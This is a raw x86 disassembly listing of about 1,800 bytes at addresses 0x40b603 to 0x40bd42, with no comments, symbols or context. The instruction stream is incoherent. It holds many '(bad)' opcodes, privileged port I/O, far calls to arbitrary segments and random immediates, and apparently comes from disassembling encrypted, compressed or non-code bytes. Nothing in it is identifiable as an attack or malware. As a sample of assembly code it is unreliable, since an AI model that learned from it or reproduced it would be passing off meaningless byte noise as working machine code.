  40b603:	mov    esp,0x8d42394
  40b608:	mov    ch,0x12
  40b60a:	xchg   ah,bh
  40b60c:	call   0xbdfe:0xd3a5c56e
  40b613:	jl     0x40b66d
  40b615:	in     al,dx
  40b616:	and    edx,esp
  40b618:	leave  
  40b619:	into   
  40b61a:	(bad)  
  40b61b:	outs   dx,DWORD PTR ds:[esi]
  40b61c:	ins    DWORD PTR es:[edi],dx
  40b61d:	xor    ebx,DWORD PTR [edx-0x24]
  40b620:	in     eax,0x27
  40b622:	or     dh,dl
  40b624:	ret    0xafc2
  40b627:	cli    
  40b628:	out    dx,eax
  40b629:	fmul   QWORD PTR [ebx-0x80]
  40b62c:	xchg   ebx,eax
  40b62d:	xor    al,0x71
  40b62f:	fist   WORD PTR ss:[eax+0x352d6e47]
  40b636:	outs   dx,BYTE PTR ds:[esi]
  40b637:	sbb    al,0xc3
  40b639:	(bad)
  40b63c:	mov    bl,0xfb
  40b63e:	and    eax,DWORD PTR [edi]
  40b640:	mov    cl,0x93
  40b642:	pop    edi
  40b643:	inc    esi
  40b644:	cld    
  40b645:	(bad)  
  40b646:	push   ebx
  40b647:	mov    al,0xaa
  40b649:	push   0x786c2b93
  40b64e:	pusha  
  40b64f:	xor    al,0x29
  40b651:	arpl   cx,di
  40b653:	dec    ecx
  40b654:	pusha  
  40b655:	js     0x40b675
  40b657:	adc    eax,0x96d1ac12
  40b65c:	in     al,dx
  40b65d:	in     al,0x28
  40b65f:	cmp    al,0x7
  40b661:	xchg   ecx,eax
  40b662:	ret    
  40b663:	or     eax,0xde3b77aa
  40b668:	ja     0x40b652
  40b66a:	jo     0x40b67f
  40b66c:	lock dec esi
  40b66e:	and    esi,DWORD PTR [esi]
  40b670:	gs jle 0x40b6cd
  40b673:	sbb    bl,bh
  40b675:	(bad)  
  40b677:	push   cs
  40b678:	in     al,dx
  40b679:	les    edx,FWORD PTR [esi]
  40b67b:	les    ebp,FWORD PTR [edi+0x6]
  40b67e:	jecxz  0x40b64b
  40b680:	add    cl,BYTE PTR [edi]
  40b682:	xchg   ebp,eax
  40b683:	or     ebx,esi
  40b685:	clc    
  40b686:	fdiv   QWORD PTR [edi-0x6a478486]
  40b68c:	(bad)  
  40b68d:	std    
  40b68e:	(bad)  
  40b68f:	push   0x8028d00
  40b694:	cmp    eax,0x3bc77e5b
  40b699:	sbb    BYTE PTR [esi-0x699e2e4],ah
  40b69f:	int3   
  40b6a0:	test   eax,0x8e8588bb
  40b6a5:	ins    DWORD PTR es:[edi],dx
  40b6a6:	mov    cl,0xce
  40b6a8:	mov    eax,0x358d653e
  40b6ad:	ror    BYTE PTR [eax+0x44],0x3a
  40b6b1:	jmp    0xa155:0xbfe8a747
  40b6b8:	xor    eax,0xb0215158
  40b6bd:	hlt    
  40b6be:	sti    
  40b6bf:	out    0xec,eax
  40b6c1:	data16 mov ah,0xa9
  40b6c4:	int3   
  40b6c5:	push   ebx
  40b6c6:	out    dx,eax
  40b6c7:	cmp    esi,DWORD PTR [ecx+0xddda037]
  40b6cd:	(bad)  
  40b6ce:	mov    al,0xe2
  40b6d0:	jnp    0x40b674
  40b6d2:	xor    ch,dl
  40b6d4:	push   esi
  40b6d5:	imul   ecx,DWORD PTR [ebp+0x3f57e4eb],0xb
  40b6dc:	xchg   ecx,eax
  40b6dd:	push   0xffffffaa
  40b6df:	fwait
  40b6e0:	(bad)  
  40b6e1:	mov    cl,0xe2
  40b6e3:	push   ecx
  40b6e4:	scas   eax,DWORD PTR es:[edi]
  40b6e5:	imul   eax,DWORD PTR [edi+0x60a4d3e6],0x2a4e5929
  40b6ef:	cmc    
  40b6f0:	sbb    bl,BYTE PTR [esi+0x68]
  40b6f3:	cmp    DWORD PTR [ebx+0x28bbd236],ecx
  40b6f9:	popf   
  40b6fa:	daa    
  40b6fb:	fild   WORD PTR ds:0x1a9b59e8
  40b701:	and    al,0x62
  40b703:	je     0x40b761
  40b705:	imul   dh
  40b707:	jg     0x40b750
  40b709:	mov    cl,0x66
  40b70b:	loop   0x40b743
  40b70d:	dec    eax
  40b70e:	jae    0x40b6a2
  40b710:	dec    esi
  40b711:	sahf   
  40b712:	in     al,dx
  40b713:	int    0x92
  40b715:	retf   
  40b716:	neg    BYTE PTR [edx]
  40b718:	xchg   edi,eax
  40b719:	or     esp,DWORD PTR [ebx]
  40b71b:	sbb    al,0xc5
  40b71d:	sub    esp,DWORD PTR [eax+edi*4+0x2a]
  40b721:	ret    
  40b722:	push   edx
  40b723:	clc    
  40b724:	cli    
  40b725:	test   al,0x5a
  40b727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b728:	dec    BYTE PTR [ebx+edi*8]
  40b72b:	fwait
  40b72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b72d:	imul   edi,DWORD PTR [ebp-0x26ef311c],0x69e1ead
  40b737:	fiadd  WORD PTR ds:0x47b34f12
  40b73d:	lock lods eax,DWORD PTR ds:[esi]
  40b73f:	sbb    eax,0x1f7e2c
  40b744:	imul   esp,DWORD PTR [edx],0xffffff9f
  40b747:	mov    bl,0x74
  40b749:	adc    eax,0x2831b4aa
  40b74e:	scas   eax,DWORD PTR es:[edi]
  40b74f:	sbb    BYTE PTR [edx+0x5c],0xd8
  40b753:	mov    cl,0xb6
  40b755:	push   esi
  40b756:	pop    esp
  40b757:	aaa    
  40b758:	dec    ebx
  40b759:	stos   BYTE PTR es:[edi],al
  40b75a:	ret    0xe833
  40b75d:	sub    al,0x36
  40b75f:	inc    eax
  40b760:	dec    edi
  40b761:	mov    ebx,ecx
  40b763:	mov    al,ah
  40b765:	lock add DWORD PTR [ebx-0x64],esp
  40b769:	icebp  
  40b76a:	add    BYTE PTR [esi],bl
  40b76c:	jb     0x40b756
  40b76e:	test   DWORD PTR [esi-0xa0b7c78],0x92483f4
  40b778:	jbe    0x40b7eb
  40b77a:	mov    ebx,0x6f776e45
  40b77f:	mov    ch,0x8
  40b781:	or     ecx,DWORD PTR [edi-0x66971c8b]
  40b787:	in     al,0x70
  40b789:	pop    ebp
  40b78a:	jge    0x40b74c
  40b78c:	test   eax,0x362e5207
  40b791:	js     0x40b7a1
  40b793:	mov    ebp,0xaf173db4
  40b798:	cmp    dl,BYTE PTR [ebp+0x31]
  40b79b:	lods   eax,DWORD PTR ds:[esi]
  40b79c:	pop    edx
  40b79d:	inc    eax
  40b79e:	jmp    0x40b801
  40b7a0:	mov    eax,0xcb3db78b
  40b7a5:	mov    ds:0xa9cf0dd6,al
  40b7aa:	cmp    BYTE PTR ds:0x454553c6,ah
  40b7b0:	cli    
  40b7b1:	out    dx,al
  40b7b2:	repz jmp 0xf960:0xdfd5a57b
  40b7ba:	ds or  al,0x2d
  40b7bd:	dec    edi
  40b7be:	adc    al,0x3e
  40b7c0:	push   0x82e91c24
  40b7c5:	pushw  ds
  40b7c7:	shr    BYTE PTR [ebx],1
  40b7c9:	nop
  40b7ca:	pop    ecx
  40b7cb:	cmp    al,0x0
  40b7cd:	mov    cl,0x60
  40b7cf:	shr    DWORD PTR [esi],cl
  40b7d1:	adc    al,0x25
  40b7d3:	xchg   ebp,eax
  40b7d4:	and    ecx,esi
  40b7d6:	pop    ds
  40b7d7:	add    eax,0xbbc76e92
  40b7dc:	test   BYTE PTR [ecx+0x26],cl
  40b7df:	jl     0x40b855
  40b7e1:	inc    ebx
  40b7e2:	mov    DWORD PTR [esp+eiz*8+0x291a0bb2],ecx
  40b7e9:	or     esp,esp
  40b7eb:	sbb    bh,al
  40b7ed:	jp     0x40b795
  40b7ef:	fstp   QWORD PTR [eax+edx*2-0x12]
  40b7f3:	ja     0x40b808
  40b7f5:	fwait
  40b7f6:	jmp    0x22e6f306
  40b7fb:	loopne 0x40b842
  40b7fd:	or     dh,al
  40b7ff:	shl    edi,0xb3
  40b802:	sub    BYTE PTR [edx],dl
  40b804:	adc    ebp,edi
  40b806:	nop
  40b807:	test   BYTE PTR [eax+edi*4],al
  40b80a:	xlat   BYTE PTR ds:[bx]
  40b80c:	push   eax
  40b80d:	xchg   ebx,eax
  40b80e:	lahf   
  40b80f:	scas   al,BYTE PTR es:[edi]
  40b810:	in     al,0xc6
  40b812:	jecxz  0x40b834
  40b814:	scas   eax,DWORD PTR es:[edi]
  40b815:	jne    0x40b858
  40b817:	sub    edi,eax
  40b819:	mov    cl,0x40
  40b81b:	mov    bh,0xd4
  40b81d:	adc    DWORD PTR [esi+0x60],ecx
  40b820:	jge    0x40b85b
  40b822:	(bad)
  40b826:	fsubr  DWORD PTR [edi+0x364d5881]
  40b82c:	xlat   BYTE PTR ds:[ebx]
  40b82d:	and    al,0x81
  40b82f:	jbe    0x40b87f
  40b831:	xchg   BYTE PTR [edi-0x21],dh
  40b834:	or     DWORD PTR [ecx+ebx*4-0x3bbe3e92],esp
  40b83b:	and    eax,DWORD PTR [ebx]
  40b83d:	bound  ebp,QWORD PTR ds:0x4e113146
  40b843:	retf   
  40b844:	push   edi
  40b845:	popf   
  40b846:	in     al,dx
  40b847:	outs   dx,BYTE PTR ds:[esi]
  40b848:	into   
  40b849:	push   eax
  40b84a:	stos   BYTE PTR es:[edi],al
  40b84b:	dec    esi
  40b84c:	js     0x40b82b
  40b84e:	out    dx,al
  40b84f:	inc    esi
  40b850:	test   eax,0x843f64ad
  40b855:	int    0x29
  40b857:	adc    al,BYTE PTR ds:0x3d8e2b7d
  40b85d:	retf   0x2223
  40b860:	xlat   BYTE PTR ds:[ebx]
  40b861:	push   0xffffffd2
  40b863:	dec    esp
  40b864:	pop    ss
  40b865:	pusha  
  40b866:	shr    DWORD PTR [ebx+0x6775b77b],cl
  40b86c:	dec    ecx
  40b86d:	lods   al,BYTE PTR ds:[esi]
  40b86e:	xlat   BYTE PTR ds:[ebx]
  40b86f:	in     eax,dx
  40b870:	dec    ebp
  40b871:	fs loopne 0x40b80d
  40b874:	mov    eax,ds:0x83de46f1
  40b879:	xor    ch,BYTE PTR [ebp-0x2274ee3d]
  40b87f:	jg     0x40b8e5
  40b881:	jmp    0xf288bb37
  40b886:	aaa    
  40b887:	sti    
  40b888:	test   BYTE PTR [esi+0x66b14973],dl
  40b88e:	push   eax
  40b88f:	xor    ebx,esp
  40b891:	cmp    esp,esp
  40b893:	bnd jo 0x40b89f
  40b896:	push   ds
  40b897:	(bad)  
  40b898:	out    dx,eax
  40b899:	ret    0x5b18
  40b89c:	js     0x40b866
  40b89e:	pop    eax
  40b89f:	pop    esi
  40b8a0:	pop    ss
  40b8a1:	dec    esi
  40b8a2:	xor    DWORD PTR [edi+0x59],ebp
  40b8a5:	in     eax,dx
  40b8a6:	xchg   BYTE PTR [ebx-0x53e35cb4],cl
  40b8ac:	adc    eax,0xc1d77324
  40b8b1:	fbld   TBYTE PTR [esi]
  40b8b3:	loope  0x40b8e3
  40b8b5:	push   ecx
  40b8b6:	pop    eax
  40b8b7:	das    
  40b8b8:	adc    BYTE PTR [eax+0x5a],0xad
  40b8bc:	mov    ebp,DWORD PTR [ebx]
  40b8be:	cld    
  40b8bf:	in     eax,dx
  40b8c0:	mov    BYTE PTR [esi+0x5e],cl
  40b8c3:	test   BYTE PTR [esi-0x23],al
  40b8c6:	cmp    BYTE PTR [edi+esi*2],0x2b
  40b8ca:	ins    DWORD PTR es:[edi],dx
  40b8cb:	mov    dl,0x67
  40b8cd:	mov    edx,0x16aa3e5e
  40b8d2:	jb     0x40b913
  40b8d4:	bound  eax,QWORD PTR [edx-0x38]
  40b8d7:	jo     0x40b8fa
  40b8d9:	dec    ecx
  40b8da:	push   ebp
  40b8db:	mov    eax,0xd8e7550e
  40b8e0:	test   BYTE PTR [ecx],bh
  40b8e2:	jp     0x40b8ab
  40b8e4:	fsubr  DWORD PTR [ecx+0x2d]
  40b8e7:	cmp    ch,BYTE PTR [edx-0x49aa84a6]
  40b8ed:	fs imul di,dx,0x6d70
  40b8f3:	dec    esi
  40b8f4:	loope  0x40b89c
  40b8f6:	jne    0x40b8f6
  40b8f8:	inc    esi
  40b8f9:	inc    ebx
  40b8fa:	retf   0xd931
  40b8fd:	sub    al,0x72
  40b8ff:	mov    ah,0xce
  40b901:	cmp    al,0x76
  40b903:	iret   
  40b904:	imul   edx,DWORD PTR [edx],0x3d
  40b907:	fnstenv [edi-0x8]
  40b90a:	sub    eax,0xff91e42f
  40b90f:	xchg   ebx,eax
  40b910:	pop    eax
  40b911:	dec    ebx
  40b912:	jmp    0xe9d0:0x2824350d
  40b919:	pop    ss
  40b91a:	cli    
  40b91b:	add    al,0x28
  40b91d:	adc    eax,0x71f223e3
  40b922:	ror    BYTE PTR [edx-0x13d15e7c],0x29
  40b929:	sbb    ecx,DWORD PTR [edi]
  40b92b:	xor    DWORD PTR [eax+0x64],eax
  40b92e:	into   
  40b92f:	add    ch,dl
  40b931:	retf   0x7668
  40b934:	inc    esp
  40b935:	pop    ss
  40b936:	repz cmp edi,DWORD PTR [ebx+ecx*4-0x28010107]
  40b93e:	lods   eax,DWORD PTR ds:[esi]
  40b93f:	(bad)  
  40b940:	out    0x78,eax
  40b942:	(bad)  
  40b943:	jle    0x40b938
  40b945:	mov    esi,es
  40b947:	jb     0x40b962
  40b949:	lods   eax,DWORD PTR ds:[esi]
  40b94a:	call   0xaf0d:0xf1af2012
  40b951:	fcomp  QWORD PTR [eax-0x1ceeb0f8]
  40b957:	inc    edx
  40b958:	(bad)  
  40b959:	push   esi
  40b95a:	or     bh,ch
  40b95c:	int3   
  40b95d:	sub    esi,DWORD PTR [edi-0x7f]
  40b960:	jge    0x40b934
  40b962:	dec    eax
  40b963:	es mov ch,0xac
  40b966:	gs and al,0x3a
  40b969:	mov    al,0xb2
  40b96b:	imul   edi,DWORD PTR [eax-0x43870ff4],0xb
  40b972:	inc    ebp
  40b973:	pop    ds
  40b974:	and    al,0x51
  40b976:	mov    ah,0xe2
  40b978:	cli    
  40b979:	jg     0x40b99f
  40b97b:	scas   eax,DWORD PTR es:[edi]
  40b97c:	lods   al,BYTE PTR ds:[esi]
  40b97d:	push   es
  40b97e:	inc    esp
  40b97f:	or     al,0xd1
  40b981:	lock inc eax
  40b983:	pop    ecx
  40b984:	lock fadd st(3),st
  40b987:	jl     0x40b920
  40b989:	inc    edx
  40b98a:	xchg   BYTE PTR [ecx-0x6b],dh
  40b98d:	and    bh,BYTE PTR [eax]
  40b98f:	ins    DWORD PTR es:[edi],dx
  40b990:	mov    eax,0xc60f27dd
  40b995:	sbb    eax,0xca84bdf6
  40b99a:	cs cli 
  40b99c:	adc    al,0xfd
  40b99e:	dec    edi
  40b99f:	mov    ebp,0xf0d9b201
  40b9a4:	sbb    DWORD PTR ds:0x9ba14e0b,esp
  40b9aa:	stc    
  40b9ab:	inc    ebp
  40b9ac:	mov    ebp,0x916700cb
  40b9b1:	arpl   ax,bx
  40b9b3:	jecxz  0x40ba03
  40b9b5:	pop    ds
  40b9b6:	pop    ebx
  40b9b7:	pop    es
  40b9b8:	fcom   QWORD PTR [ecx+0x1ccd0547]
  40b9be:	sahf   
  40b9bf:	inc    esp
  40b9c0:	dec    edi
  40b9c1:	or     eax,0xcc11639b
  40b9c6:	add    al,0x4c
  40b9c8:	xchg   esi,eax
  40b9c9:	pushf  
  40b9ca:	sahf   
  40b9cb:	mov    cl,0xb8
  40b9cd:	outs   dx,DWORD PTR ds:[esi]
  40b9ce:	cdq    
  40b9cf:	call   0xa324f738
  40b9d4:	aas    
  40b9d5:	pop    esp
  40b9d6:	in     eax,dx
  40b9d7:	mov    cl,0x51
  40b9d9:	es repz sbb ecx,esi
  40b9dd:	pop    edi
  40b9de:	icebp  
  40b9df:	fild   QWORD PTR [edx-0x3361b695]
  40b9e5:	mov    eax,0x4a77f6da
  40b9ea:	jns    0x40b990
  40b9ec:	sub    al,0xba
  40b9ee:	xor    edi,edx
  40b9f0:	aaa    
  40b9f1:	mov    bh,dl
  40b9f3:	mov    WORD PTR [edx],?
  40b9f5:	lea    esi,ds:0xa7ded13f
  40b9fb:	pusha  
  40b9fc:	fild   DWORD PTR [ecx-0x5fe2f20f]
  40ba02:	adc    BYTE PTR [edi+0xf],dh
  40ba05:	int3   
  40ba06:	je     0x40b9a8
  40ba08:	sbb    bl,al
  40ba0a:	nop
  40ba0b:	and    al,0xee
  40ba0d:	cli    
  40ba0e:	push   ebp
  40ba0f:	out    0xd7,al
  40ba11:	retf   
  40ba12:	pop    esi
  40ba13:	add    al,0xae
  40ba15:	cdq    
  40ba16:	(bad)  
  40ba17:	jns    0x40ba39
  40ba19:	jns    0x40ba6b
  40ba1b:	jae    0x40ba22
  40ba1d:	and    al,0x95
  40ba1f:	sbb    BYTE PTR [ebx-0x7fc77ed7],dl
  40ba25:	add    bl,BYTE PTR [edi]
  40ba27:	xchg   BYTE PTR [edi-0x24],bh
  40ba2a:	jae    0x40b9cc
  40ba2c:	push   eax
  40ba2d:	xor    DWORD PTR [ebx-0xf4f55d],ecx
  40ba33:	push   esi
  40ba34:	sub    DWORD PTR [esi-0x25ba7d5f],edi
  40ba3a:	and    al,BYTE PTR [esi+0x18]
  40ba3d:	fwait
  40ba3e:	pop    di
  40ba40:	outs   dx,DWORD PTR ds:[esi]
  40ba41:	sub    al,0x20
  40ba43:	enter  0x9ddd,0xef
  40ba47:	mov    dl,0x91
  40ba49:	inc    ebx
  40ba4a:	js     0x40b9f5
  40ba4c:	sbb    DWORD PTR [edi],ebp
  40ba4e:	out    0x98,eax
  40ba50:	jle    0x40ba21
  40ba52:	xchg   ebp,eax
  40ba53:	mov    ebx,0x18d72a0b
  40ba58:	inc    edi
  40ba59:	retf   0xf0ae
  40ba5c:	ret    0x35dc
  40ba5f:	aam    0x96
  40ba61:	in     al,0xbf
  40ba63:	dec    esp
  40ba64:	mov    BYTE PTR [esi],dl
  40ba66:	sbb    eax,0xe9e37a9b
  40ba6b:	sbb    ch,BYTE PTR es:[ebx-0x17]
  40ba6f:	retf   0x7afe
  40ba72:	jecxz  0x40bab6
  40ba74:	cmp    esp,edi
  40ba76:	jmp    0x72963fcc
  40ba7b:	scas   al,BYTE PTR es:[edi]
  40ba7c:	enter  0xf2f9,0xc9
  40ba80:	mov    gs,WORD PTR [esi-0x7fe94f75]
  40ba86:	xchg   cl,bh
  40ba88:	xor    BYTE PTR ds:[ebp-0xb],bl
  40ba8c:	and    DWORD PTR [eax+0x54],0x1c787b28
  40ba93:	mov    al,ds:0xe8a43ce8
  40ba98:	inc    ebp
  40ba99:	push   ss
  40ba9a:	adc    DWORD PTR [ebp-0x6a9e8b58],esp
  40baa0:	mov    edx,0xa9edffa7
  40baa5:	fsub   st,st(5)
  40baa7:	bound  esp,QWORD PTR [esi-0x888e380]
  40baad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baae:	push   es
  40baaf:	and    DWORD PTR [ebp+0x69],ebx
  40bab2:	add    al,0xe8
  40bab4:	jecxz  0x40bac5
  40bab6:	fisubr WORD PTR [bx+si+0x78]
  40baba:	stos   BYTE PTR es:[edi],al
  40babb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40babc:	push   ebx
  40babd:	cmp    DWORD PTR [ebx-0x37ddc0d5],0xffffffa6
  40bac4:	sahf   
  40bac5:	mov    ah,0xdf
  40bac7:	lock call 0xbf8e1b65
  40bacd:	pushf  
  40bace:	scas   al,BYTE PTR es:[edi]
  40bacf:	mov    ecx,0x4bc43fc9
  40bad4:	hlt    
  40bad5:	push   ebx
  40bad6:	dec    edi
  40bad7:	pushf  
  40bad8:	ret    
  40bad9:	xchg   ebp,eax
  40badb:	pop    esi
  40badc:	addr16 jp 0x40bb4e
  40badf:	popf   
  40bae0:	sub    ebx,edi
  40bae2:	test   al,0x7f
  40bae5:	pop    ds
  40bae6:	ins    BYTE PTR es:[edi],dx
  40bae7:	mov    ah,0xbb
  40bae9:	jae    0x40bb47
  40baeb:	popa   
  40baec:	pushf  
  40baed:	mov    dl,0x4a
  40baef:	mov    dl,0x1f
  40baf1:	mov    al,ds:0xc0c3f250
  40baf6:	jo     0x40bb4a
  40baf8:	mov    eax,ds:0x75e112f3
  40bafd:	sub    cl,bl
  40baff:	mov    al,0xbd
  40bb01:	popf   
  40bb02:	adc    eax,0xd1bb0bbe
  40bb07:	push   esp
  40bb08:	pop    esi
  40bb09:	mov    al,0x32
  40bb0b:	inc    ebx
  40bb0c:	scas   eax,DWORD PTR es:[edi]
  40bb0d:	outs   dx,DWORD PTR ds:[esi]
  40bb0e:	outs   dx,DWORD PTR ds:[esi]
  40bb0f:	push   ebx
  40bb10:	inc    eax
  40bb11:	retf   
  40bb12:	xchg   DWORD PTR [eax-0x2e],edx
  40bb15:	sbb    bh,dh
  40bb17:	and    esi,DWORD PTR [edx+edx*2-0x50d3ecb2]
  40bb1e:	mov    ds:0xae2e859f,eax
  40bb23:	jne    0x40bb69
  40bb25:	sub    BYTE PTR [edx+0x3d235710],dl
  40bb2b:	jp     0x40bb16
  40bb2d:	cwde   
  40bb2e:	adc    dh,BYTE PTR [ecx]
  40bb30:	lods   al,BYTE PTR ds:[esi]
  40bb31:	jne    0x40bb18
  40bb33:	arpl   WORD PTR [eax+0xb5cfdba],ax
  40bb39:	fsub   st,st(2)
  40bb3b:	push   ebx
  40bb3c:	stos   DWORD PTR es:[edi],eax
  40bb3d:	or     ebx,DWORD PTR [edi-0x23278311]
  40bb43:	in     eax,dx
  40bb44:	xor    al,0xb8
  40bb46:	mov    al,0x5e
  40bb48:	gs pop esi
  40bb4a:	pop    DWORD PTR [esp+eiz*4-0x79]
  40bb4e:	push   eax
  40bb4f:	xchg   esp,eax
  40bb50:	pop    ss
  40bb51:	popf   
  40bb52:	ret    
  40bb53:	bound  ebp,QWORD PTR [ebx+0x3e]
  40bb56:	fcmovnu st,st(5)
  40bb58:	sub    al,0x18
  40bb5a:	out    0xd6,al
  40bb5c:	mov    bl,0x5d
  40bb5e:	ss jg  0x40bb10
  40bb61:	push   eax
  40bb62:	jo     0x40bb1a
  40bb64:	xor    BYTE PTR [eax],dl
  40bb66:	add    dh,dh
  40bb68:	add    al,0xfd
  40bb6a:	xor    BYTE PTR [eax+0x19],al
  40bb6d:	int3   
  40bb6e:	in     al,dx
  40bb6f:	fld    QWORD PTR [eax+ebx*2+0x46]
  40bb73:	xor    BYTE PTR [ecx-0x71d22ae8],ch
  40bb79:	sbb    ecx,DWORD PTR [ecx-0x54]
  40bb7c:	xchg   edx,eax
  40bb7d:	xchg   esp,eax
  40bb7e:	push   esp
  40bb7f:	ret    0x2e5a
  40bb82:	out    0xd2,al
  40bb84:	lahf   
  40bb85:	dec    ecx
  40bb86:	add    ecx,DWORD PTR [edx-0x872cca6]
  40bb8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb8d:	aad    0x71
  40bb8f:	sbb    BYTE PTR [ebp+0x5d7a1fb6],ch
  40bb95:	mov    ebx,0x65edd854
  40bb9a:	cmp    eax,0xe552b4d5
  40bb9f:	adc    esi,edx
  40bba1:	sbb    edx,eax
  40bba3:	(bad)  
  40bba4:	mov    ebp,0xba193e3a
  40bba9:	popa   
  40bbaa:	ja     0x40bc04
  40bbac:	xor    BYTE PTR [esi-0x4ca21537],ah
  40bbb2:	icebp  
  40bbb3:	pop    eax
  40bbb4:	loope  0x40bb51
  40bbb6:	enter  0x5ba0,0x38
  40bbba:	jge    0x40bb43
  40bbbc:	sahf   
  40bbbd:	xor    BYTE PTR ss:[eax],0x47
  40bbc1:	mov    esp,eax
  40bbc3:	ret    0xd8ad
  40bbc6:	mov    ah,BYTE PTR [esi+eax*4+0x5668f6c6]
  40bbcd:	mov    bl,0xdc
  40bbcf:	inc    ebp
  40bbd0:	aaa    
  40bbd1:	sbb    al,0x2d
  40bbd3:	dec    ebx
  40bbd4:	shl    ebx,cl
  40bbd6:	mov    dh,0x63
  40bbd8:	lods   al,BYTE PTR ds:[esi]
  40bbd9:	dec    esp
  40bbda:	sub    eax,0x4a8d8174
  40bbdf:	clc    
  40bbe0:	dec    eax
  40bbe1:	lods   eax,DWORD PTR ds:[esi]
  40bbe2:	ds in  al,dx
  40bbe4:	xchg   BYTE PTR [eax-0x3a7f9dfa],cl
  40bbea:	call   0xdff33c8
  40bbef:	es mov DWORD PTR cs:[edx+0x50869aa5],ebx
  40bbf7:	out    0x29,eax
  40bbf9:	in     eax,0xba
  40bbfb:	mov    dl,0x4
  40bbfd:	lds    edx,FWORD PTR [ecx]
  40bbff:	sahf   
  40bc00:	test   al,0x6f
  40bc02:	das    
  40bc03:	and    bl,bl
  40bc05:	retf   0x9f85
  40bc08:	clc    
  40bc09:	out    0x13,eax
  40bc0b:	jg     0x40bbd1
  40bc0d:	gs jno 0x40bc7e
  40bc10:	cdq    
  40bc11:	xor    al,0x50
  40bc13:	mov    ebp,DWORD PTR [ebp+0x1bc0244b]
  40bc19:	jmp    0xb0e10037
  40bc1e:	sub    al,0xc5
  40bc21:	imul   ebp,DWORD PTR [edi],0x18
  40bc24:	or     BYTE PTR ds:0x6a2577ea,bh
  40bc2a:	rcl    DWORD PTR [eax-0x9],cl
  40bc2d:	lahf   
  40bc2e:	jge    0x40bc81
  40bc30:	mov    DWORD PTR [edi+0x19],0xd4ebf6d0
  40bc37:	js     0x40bc17
  40bc39:	lahf   
  40bc3a:	mov    bl,0x70
  40bc3c:	(bad)  
  40bc3d:	lock aas 
  40bc3f:	rol    al,0x8f
  40bc42:	adc    edi,ecx
  40bc44:	test   eax,0xaebce156
  40bc49:	xor    al,0xb9
  40bc4b:	cld    
  40bc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc4d:	cli    
  40bc4e:	imul   esi,esp,0xf18987f4
  40bc54:	ffreep st(4)
  40bc56:	adc    al,0x89
  40bc58:	loop   0x40bbfb
  40bc5a:	push   edx
  40bc5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc5c:	sbb    ch,0x27
  40bc5f:	xchg   edi,eax
  40bc60:	retf   0x49dd
  40bc63:	iret   
  40bc64:	ins    DWORD PTR es:[edi],dx
  40bc65:	popa   
  40bc66:	inc    ecx
  40bc67:	sub    DWORD PTR [edi+0x58],ebx
  40bc6a:	push   ds
  40bc6b:	(bad)  
  40bc6c:	sbb    ebp,DWORD PTR [edx+0x1487b018]
  40bc72:	or     BYTE PTR [ebx],0x47
  40bc75:	pop    es
  40bc76:	dec    esp
  40bc77:	test   DWORD PTR [esi],ebx
  40bc79:	lods   al,BYTE PTR ds:[esi]
  40bc7a:	sub    edi,esp
  40bc7c:	stos   DWORD PTR es:[edi],eax
  40bc7d:	xchg   edi,eax
  40bc7e:	mov    ds:0x98eef45b,al
  40bc83:	xchg   ebx,eax
  40bc84:	leave  
  40bc85:	jg     0x40bc91
  40bc87:	lahf   
  40bc88:	xor    al,0xda
  40bc8a:	int    0xcf
  40bc8c:	scas   al,BYTE PTR es:[edi]
  40bc8d:	cmp    BYTE PTR [edi-0x6037c123],ch
  40bc93:	aaa    
  40bc94:	jle    0x40bc2d
  40bc96:	(bad)  
  40bc97:	and    BYTE PTR [eax+0x6c],ah
  40bc9a:	and    BYTE PTR [ebx+edi*8+0x6e],cl
  40bc9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9f:	loop   0x40bce3
  40bca1:	sbb    DWORD PTR [esi+0x11067002],0x1f
  40bca8:	mov    dl,0x10
  40bcaa:	dec    ebp
  40bcab:	and    dl,BYTE PTR [eax-0x4e]
  40bcae:	xchg   edi,eax
  40bcaf:	mov    ecx,0x1607e1e7
  40bcb4:	or     edx,edx
  40bcb6:	jo     0x40bc7f
  40bcb8:	sub    bh,bh
  40bcba:	aaa    
  40bcbb:	xor    DWORD PTR [esi-0x7f8e6d15],esi
  40bcc1:	test   edx,ebp
  40bcc3:	enter  0xf27a,0x12
  40bcc7:	jg     0x40bce0
  40bcc9:	jns    0x40bcac
  40bccb:	mov    bh,bl
  40bccd:	stos   BYTE PTR es:[edi],al
  40bcce:	inc    BYTE PTR [edx+edx*8+0x3d714d01]
  40bcd5:	daa    
  40bcd6:	push   ss
  40bcd7:	aas    
  40bcd8:	ds idiv ebx
  40bcdb:	push   0x862903
  40bce0:	into   
  40bce1:	iret   
  40bce2:	cmc    
  40bce3:	adc    eax,0x23326375
  40bce8:	hlt    
  40bce9:	cmp    ah,BYTE PTR [edi]
  40bceb:	pop    ebp
  40bcec:	add    eax,0x886a0d2c
  40bcf1:	pop    edx
  40bcf2:	add    al,0x3d
  40bcf4:	jbe    0x40bd2f
  40bcf6:	mov    esi,0xb4576793
  40bcfb:	sub    al,0x6e
  40bcfd:	xchg   DWORD PTR [edx+eax*1+0x69],ebp
  40bd01:	push   ecx
  40bd02:	adc    ah,dh
  40bd04:	sti    
  40bd05:	add    esp,DWORD PTR [edx+0x74e71830]
  40bd0b:	retf   
  40bd0c:	sub    ecx,0xa15695ad
  40bd12:	pusha  
  40bd13:	shl    DWORD PTR [ebx-0x9],0x5b
  40bd17:	jno    0x40bd47
  40bd19:	std    
  40bd1a:	outs   dx,BYTE PTR ds:[esi]
  40bd1b:	add    edx,DWORD PTR [edx]
  40bd1d:	aaa    
  40bd1e:	cmp    al,0xc7
  40bd20:	inc    ebp
  40bd21:	ds dec ecx
  40bd23:	mov    ebp,0x126d43ee
  40bd29:	fwait
  40bd2a:	shl    DWORD PTR [esi+0x63],0x52
  40bd2e:	mov    ecx,DWORD PTR [edx-0x33]
  40bd31:	ret    0xd636
  40bd34:	pop    ecx
  40bd35:	mov    bl,0x4f
  40bd37:	mov    cl,0x32
  40bd39:	fistp  DWORD PTR ds:0xd09913b
  40bd3f:	sbb    DWORD PTR [edx],edi
  40bd41:	outs   dx,DWORD PTR ds:[esi]
  40bd42:	pop    ss
